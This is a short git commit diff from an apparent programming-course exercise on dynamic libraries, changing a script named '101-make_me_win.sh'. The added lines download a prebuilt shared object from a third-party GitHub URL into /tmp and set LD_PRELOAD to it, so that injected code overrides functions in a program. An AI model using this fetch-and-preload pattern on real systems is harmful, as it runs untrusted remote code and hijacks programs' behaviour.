8219d52937d76332d2788a9e5d653a6d9e3a3c38
softtech2005 <enginemustoby@gmail.com>
2024-04-06 02:21:26 -0700

    udated

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-cp /home/giga_millions/gm .
-LD_PRELOAD=./liball.so ./gm 9 8 10 24 75 9
+wget -P /tmp https://github.com/eyoul/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so
+export LD_PRELOAD=/tmp/iwin.so
